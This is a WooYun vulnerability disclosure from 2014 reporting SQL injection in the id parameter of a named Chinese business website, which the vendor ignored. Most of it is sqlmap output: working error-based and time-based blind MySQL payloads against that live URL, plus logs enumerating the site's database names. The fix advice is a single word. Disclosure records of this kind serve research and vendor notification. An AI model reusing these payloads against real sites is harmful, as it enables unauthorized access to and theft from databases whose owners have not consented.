wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-05-03：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-06-17：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql 详细说明：  
http://www.shajia.cn/business_cont.php?id=749

sqlmap identified the following injection points with a total of 36 HTTP(s) requests:---Place: GETParameter: id    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=749 AND (SELECT 4600 FROM(SELECT COUNT(*),CONCAT(0x3a626d663a,(SELECT (CASE WHEN (4600=4600) THEN 1 ELSE 0 END)),0x3a6767793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=749 AND SLEEP(5)---[01:13:53] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0[01:13:53] [INFO] fetching database names[01:14:06] [INFO] the SQL query used returns 2 entries[01:14:17] [INFO] retrieved: information_schema[01:14:27] [INFO] retrieved: ZBlljqYdAnkFkdWXkgplavailable databases [2]:[*] information_schema[*] ZBlljqYdAnkFkdWXkgpl
   漏洞证明：  ...   修复方案：  过滤   版权声明：转载请注明来源 Mosuan@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
